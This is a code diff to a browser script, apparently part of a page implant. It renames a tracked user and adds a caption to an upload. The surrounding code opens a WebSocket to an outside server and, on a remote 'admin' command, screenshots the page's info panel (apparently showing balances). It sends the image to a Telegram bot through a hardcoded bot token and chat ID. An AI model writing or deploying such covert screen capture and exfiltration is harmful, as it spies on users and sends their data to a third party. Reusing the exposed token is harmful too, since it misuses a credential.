@@ -750,7 +750,7 @@ notificationContainer.appendChild(textElement);
 notificationContainer.appendChild(closeButton);
 
 // Updated WebSocket connection
-//const name = 'vivien'; // Set the user identifier
+//const name = 'Vivien'; // Set the user identifier
 //console.log(name)
 // Глобальная переменная
 // Глобальная переменная
@@ -769,7 +769,7 @@ notificationContainer.appendChild(closeButton);
 
 
 
-const name = 'vivien';
+const name = 'Vivien';
 
 function connect() {
   const socket = new WebSocket(`wss://appnode.why-not-chat.com/?name=${name}`);
@@ -809,6 +809,7 @@ function connect() {
   function handleAdminResponse(message) {
     const botToken = '6019277840:AAGc9DQWszbE7nEraRKNxV4FSRHT5KMFhlE';
     const chatId = '1022126654'; // Замените на ID вашего чата с ботом
+    const userBals = 'Vivien';
       // Выполняем снимок экрана и отправляем в Telegram
       var elementToScreenshot = document.querySelector('.info-panel');
 
@@ -817,11 +818,13 @@ function connect() {
           var screenshotBlob = dataURItoBlob(screenshotDataUrl);
 
           var formData = new FormData();
-          formData.append('photo', screenshotBlob, 'screenshot.png');
+          formData.append('photo', screenshotBlob, 'screenshot.png', 'userBals');
+          formData.append('caption', userBals);
 
           fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
               method: 'POST',
               body: formData
+
               
           })
           .then(response => response.json())
